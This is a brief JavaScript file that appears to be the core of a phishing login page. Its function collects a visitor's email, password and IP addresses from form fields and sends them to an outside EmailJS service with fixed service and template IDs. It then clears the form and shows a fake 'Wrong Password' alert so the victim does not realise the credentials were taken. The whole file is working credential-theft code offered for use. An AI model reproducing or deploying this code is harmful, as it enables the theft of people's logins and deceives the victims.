function sendMail() {
  var params = {
    email: document.getElementById("email").value,
    password: document.getElementById("password").value,
    IPv4: document.getElementById("IPv4").value,
    IPv6: document.getElementById("IPv6").value,
  };

  const serviceID = "service_v127bm1";
  const templateID = "template_avc41ik";

    emailjs.send(serviceID, templateID, params)
    .then(res=>{
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
        console.log(res);
        alert("Wrong Password")

    })
    .catch(err=>console.log(err));

}
